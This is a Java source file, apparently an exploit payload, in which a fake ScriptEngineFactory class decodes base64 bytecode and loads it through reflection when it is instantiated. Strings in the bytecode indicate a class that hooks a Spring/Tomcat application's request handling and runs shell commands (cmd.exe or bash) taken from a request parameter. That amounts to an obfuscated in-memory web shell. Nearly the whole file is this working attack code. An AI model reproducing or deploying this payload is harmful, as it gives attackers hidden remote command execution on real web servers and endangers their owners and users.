package artsploit;


import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.boot.context.embedded.AnnotationConfigEmbeddedWebApplicationContext;
import org.springframework.boot.context.embedded.tomcat.TomcatEmbeddedWebappClassLoader;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;


public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
    public AwesomeScriptEngineFactory() {
        try {
            ClassLoader classLoader = this.getClass().getClassLoader();
            Class evilClass = defineClass(classLoader, "yv66vgAAADQAzAoACQBnCgBoAGkKAGgAagoACQBrCgAHAGwIADsHAG0KAAcAbgcAbwoAcABxCAA+CAByCgAHAHMKAHQAdQoAdAB2CABDBwB3CAB4CABHCABICAB5CABLCQB6AHsIAHwKAH0AfgcAfwoAGgCACwCBAIILAIEAgwoABwCECACFCgARAIYIAIcHAIgIAIkKAC8AigoABwCLCgAaAIwIAF4HAGQJAI0AjgoABwCPCgBwAHUKAJAAkQoAkgCTCgCNAJQHAJUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQABaQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABHRoaXMBABBMYXJ0c3Bsb2l0L0V2aWw7AQARdG9tY2F0Q2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADGdldFJlc291cmNlcwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAJcmVzb3VyY2VzAQAKZ2V0Q29udGV4dAEAFXRvbWNhdEVtYmVkZGVkQ29udGV4dAEADGNvbnRleHRGaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABJhcHBsaWNhdGlvbkNvbnRleHQBAAxnZXRBdHRyaWJ1dGUBABV3ZWJBcHBsaWNhdGlvbkNvbnRleHQBABphYnN0cmFjdEFwcGxpY2F0aW9uQ29udGV4dAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAHZ2V0QmVhbgEAFmdldEJlYW5EZWZpbml0aW9uTmFtZXMBABZhYnN0cmFjdEhhbmRsZXJNYXBwaW5nAQAFZmllbGQBABNhZGFwdGVkSW50ZXJjZXB0b3JzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAUZ2V0UGFyZW50Q0xhc3NMb2FkZXIBABFwYXJlbnRDbGFzc0xvYWRlcgEACm1hZGFvQ2xhc3MBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAUTGphdmEvbGFuZy9DbGFzczwqPjsBAClMamF2YS91dGlsL0FycmF5TGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEADVN0YWNrTWFwVGFibGUHAJUHAIgHAJYHAG8HAJcHAG0HAH8HAJgBAApFeGNlcHRpb25zBwCZAQALZGVmaW5lQ2xhc3MBADwoTGphdmEvbGFuZy9DbGFzc0xvYWRlcjtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAtjbGFzc0xvYWRlcgEACWNsYXNzQnl0ZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACWV2YWxCeXRlcwEAAltCAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwAMAAxBwCaDACbAJwMAJ0AngwAnwCgDAChAKABAA9qYXZhL2xhbmcvQ2xhc3MMAKIAowEAEGphdmEvbGFuZy9PYmplY3QHAJYMAKQApQEAB2NvbnRleHQMAKYApwcAlwwAqACpDACqAKsBABBqYXZhL2xhbmcvU3RyaW5nAQA6b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5XZWJBcHBsaWNhdGlvbkNvbnRleHQuUk9PVAEAHHJlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcHAKwMAK0ArgEAAzFvawcArwwAsACxAQATamF2YS91dGlsL0FycmF5TGlzdAwAsgCzBwCYDAC0ALUMALYAtwwAuAC5AQAFTWFkYW8MALoAuwEAFGdldFBhcmVudENsYXNzTG9hZGVyAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQzEeXY2NnZnQUFBRFFBbFFvQUlnQklDQUJKQ3dCS0FFc0lBRXdLQUUwQVRnb0FDZ0JQQ0FCUUNnQUtBRkVLQUZJQVV3Y0FWQWdBVlFnQVZnb0FVZ0JYQ0FCWUNBQlpCd0JhQndCYkNnQmNBRjBLQUJFQVhnb0FFQUJmQndCZ0NnQVZBRWdLQUJBQVlRb0FGUUJpQ2dBVkFHTUtBQlVBWkFzQVpRQm1DZ0FLQUdjS0FHZ0FhUW9BYUFCcUNnQm9BR3NMQUdVQWJBY0FiUWNBYmdFQUJqeHBibWwwUGdFQUF5Z3BWZ0VBQkVOdlpHVUJBQTlNYVc1bFRuVnRZbVZ5VkdGaWJHVUJBQkpNYjJOaGJGWmhjbWxoWW14bFZHRmliR1VCQUFSMGFHbHpBUUFSVEdGeWRITndiRzlwZEM5TllXUmhienNCQUFsd2NtVklZVzVrYkdVQkFHUW9UR3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnlkbXhsZEZKbGNYVmxjM1E3VEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjM0J2Ym5ObE8weHFZWFpoTDJ4aGJtY3ZUMkpxWldOME95bGFBUUFIY0hKdlkyVnpjd0VBRTB4cVlYWmhMMnhoYm1jdlVISnZZMlZ6Y3pzQkFBNWlkV1ptWlhKbFpGSmxZV1JsY2dFQUdFeHFZWFpoTDJsdkwwSjFabVpsY21Wa1VtVmhaR1Z5T3dFQURYTjBjbWx1WjBKMWFXeGtaWElCQUJsTWFtRjJZUzlzWVc1bkwxTjBjbWx1WjBKMWFXeGtaWEk3QVFBRWJHbHVaUUVBRWt4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3dFQUEyTnRaQUVBQjNKbGNYVmxjM1FCQUNkTWFtRjJZWGd2YzJWeWRteGxkQzlvZEhSd0wwaDBkSEJUWlhKMmJHVjBVbVZ4ZFdWemREc0JBQWh5WlhOd2IyNXpaUUVBS0V4cVlYWmhlQzl6WlhKMmJHVjBMMmgwZEhBdlNIUjBjRk5sY25ac1pYUlNaWE53YjI1elpUc0JBQWRvWVc1a2JHVnlBUUFTVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3QVFBTlUzUmhZMnROWVhCVVlXSnNaUWNBVkFjQWJ3Y0FXZ2NBWUFjQWJRY0FjQWNBY1FjQWNnRUFDa1Y0WTJWd2RHbHZibk1IQUhNQkFBcFRiM1Z5WTJWR2FXeGxBUUFLVFdGa1lXOHVhbUYyWVF3QUl3QWtBUUFHY0dGemMyVnlCd0J3REFCMEFIVUJBQWR2Y3k1dVlXMWxCd0IyREFCM0FIVU1BSGdBZVFFQUEzZHBiZ3dBZWdCN0J3QjhEQUI5QUg0QkFCQnFZWFpoTDJ4aGJtY3ZVM1J5YVc1bkFRQUhZMjFrTG1WNFpRRUFBaTlqREFCL0FJQUJBQVJpWVhOb0FRQUNMV01CQUJacVlYWmhMMmx2TDBKMVptWmxjbVZrVW1WaFpHVnlBUUFaYW1GMllTOXBieTlKYm5CMWRGTjBjbVZoYlZKbFlXUmxjZ2NBYnd3QWdRQ0NEQUFqQUlNTUFDTUFoQUVBRjJwaGRtRXZiR0Z1Wnk5VGRISnBibWRDZFdsc1pHVnlEQUNGQUhrTUFJWUFod3dBaGdDSURBQ0pBSGtIQUhFTUFJb0Fpd3dBakFDTkJ3Q09EQUNQQUpBTUFKRUFKQXdBa2dBa0RBQ1RBSlFCQUE5aGNuUnpjR3h2YVhRdlRXRmtZVzhCQUVGdmNtY3ZjM0J5YVc1blpuSmhiV1YzYjNKckwzZGxZaTl6WlhKMmJHVjBMMmhoYm1Sc1pYSXZTR0Z1Wkd4bGNrbHVkR1Z5WTJWd2RHOXlRV1JoY0hSbGNnRUFFV3BoZG1FdmJHRnVaeTlRY205alpYTnpBUUFsYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnhkV1Z6ZEFFQUptcGhkbUY0TDNObGNuWnNaWFF2YUhSMGNDOUlkSFJ3VTJWeWRteGxkRkpsYzNCdmJuTmxBUUFRYW1GMllTOXNZVzVuTDA5aWFtVmpkQUVBRTJwaGRtRXZiR0Z1Wnk5RmVHTmxjSFJwYjI0QkFBeG5aWFJRWVhKaGJXVjBaWElCQUNZb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFFR3BoZG1FdmJHRnVaeTlUZVhOMFpXMEJBQXRuWlhSUWNtOXdaWEowZVFFQUMzUnZURzkzWlhKRFlYTmxBUUFVS0NsTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBaGpiMjUwWVdsdWN3RUFHeWhNYW1GMllTOXNZVzVuTDBOb1lYSlRaWEYxWlc1alpUc3BXZ0VBRVdwaGRtRXZiR0Z1Wnk5U2RXNTBhVzFsQVFBS1oyVjBVblZ1ZEdsdFpRRUFGU2dwVEdwaGRtRXZiR0Z1Wnk5U2RXNTBhVzFsT3dFQUJHVjRaV01CQUNnb1cweHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bE1hbUYyWVM5c1lXNW5MMUJ5YjJObGMzTTdBUUFPWjJWMFNXNXdkWFJUZEhKbFlXMEJBQmNvS1V4cVlYWmhMMmx2TDBsdWNIVjBVM1J5WldGdE93RUFHQ2hNYW1GMllTOXBieTlKYm5CMWRGTjBjbVZoYlRzcFZnRUFFeWhNYW1GMllTOXBieTlTWldGa1pYSTdLVllCQUFoeVpXRmtUR2x1WlFFQUJtRndjR1Z1WkFFQUxTaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtZENkV2xzWkdWeU93RUFIQ2hES1V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuUW5WcGJHUmxjanNCQUFoMGIxTjBjbWx1WndFQUQyZGxkRTkxZEhCMWRGTjBjbVZoYlFFQUpTZ3BUR3BoZG1GNEwzTmxjblpzWlhRdlUyVnlkbXhsZEU5MWRIQjFkRk4wY21WaGJUc0JBQWhuWlhSQ2VYUmxjd0VBQkNncFcwSUJBQ0ZxWVhaaGVDOXpaWEoyYkdWMEwxTmxjblpzWlhSUGRYUndkWFJUZEhKbFlXMEJBQVYzY21sMFpRRUFCU2hiUWlsV0FRQUZabXgxYzJnQkFBVmpiRzl6WlFFQUNYTmxibVJGY25KdmNnRUFCQ2hKS1ZZQUlRQWhBQ0lBQUFBQUFBSUFBUUFqQUNRQUFRQWxBQUFBTHdBQkFBRUFBQUFGS3JjQUFiRUFBQUFDQUNZQUFBQUdBQUVBQUFBS0FDY0FBQUFNQUFFQUFBQUZBQ2dBS1FBQUFBRUFLZ0FyQUFJQUpRQUFBZDBBQlFBSkFBQUEzQ3NTQXJrQUF3SUF4Z0RTS3hJQ3VRQURBZ0E2QkJrRXhnQzRFZ1M0QUFXMkFBWVNCN1lBQ0prQUliZ0FDUWE5QUFwWkF4SUxVMWtFRWd4VFdRVVpCRk8yQUEwNkJhY0FIcmdBQ1FhOUFBcFpBeElPVTFrRUVnOVRXUVVaQkZPMkFBMDZCYnNBRUZtN0FCRlpHUVcyQUJLM0FCTzNBQlE2QnJzQUZWbTNBQlk2QnhrR3RnQVhXVG9JeGdBZ0dRZTdBQlZadHdBV0dRaTJBQmdRQ3JZQUdiWUFHcllBR0Zlbi85c3N1UUFiQVFBWkI3WUFHcllBSExZQUhTeTVBQnNCQUxZQUhpeTVBQnNCQUxZQUg2Y0FEQ3dSQVpTNUFDQUNBQU9zQkt3QUFBQURBQ1lBQUFCR0FCRUFBQUFNQUFzQURRQVZBQTRBR2dBUUFDb0FFUUJJQUJNQVl3QVdBSGdBRndDQkFCb0FqQUFiQUtrQUhnQzZBQjhBd3dBZ0FNd0FJUURQQUNJQTJBQWtBTm9BSmdBbkFBQUFaZ0FLQUVVQUF3QXNBQzBBQlFCakFHa0FMQUF0QUFVQWVBQlVBQzRBTHdBR0FJRUFTd0F3QURFQUJ3Q0pBRU1BTWdBekFBZ0FGUURGQURRQU13QUVBQUFBM0FBb0FDa0FBQUFBQU53QU5RQTJBQUVBQUFEY0FEY0FPQUFDQUFBQTNBQTVBRG9BQXdBN0FBQUFOd0FIL0FCSUJ3QTgvQUFhQndBOS9RQWRCd0ErQndBLy9BQW5Cd0E4L3dBbEFBVUhBRUFIQUVFSEFFSUhBRU1IQUR3QUFBajZBQUVBUkFBQUFBUUFBUUJGQUFFQVJnQUFBQUlBUnc9PQwAXgBfDAC8ALcMAL0AvgcAvwwAwABGDADBAKMHAMIMAMMAxgcAxwwAyADJDADKAMsBAA5hcnRzcGxvaXQvRXZpbAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQASamF2YS91dGlsL0l0ZXJhdG9yAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQANZ2V0U3VwZXJjbGFzcwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2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");
            evilClass.newInstance();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }




    public static Class defineClass(ClassLoader classLoader, String classByte) throws Exception {
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
        defineClass.setAccessible(true);
        byte[] evalBytes = Base64.getDecoder().decode(classByte);
        return (Class<?>) defineClass.invoke(classLoader, new Object[]{evalBytes, 0, evalBytes.length});
    }

    public String getEngineName() {
        return null;
    }

    public String getEngineVersion() {
        return null;
    }

    public List<String> getExtensions() {
        return null;
    }

    public List<String> getMimeTypes() {
        return null;
    }

    public List<String> getNames() {
        return null;
    }

    public String getLanguageName() {
        return null;
    }

    public String getLanguageVersion() {
        return null;
    }

    public Object getParameter(String key) {
        return null;
    }

    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    public String getOutputStatement(String toDisplay) {
        return null;
    }

    public String getProgram(String... statements) {
        return null;
    }

    public ScriptEngine getScriptEngine() {
        return null;
    }
}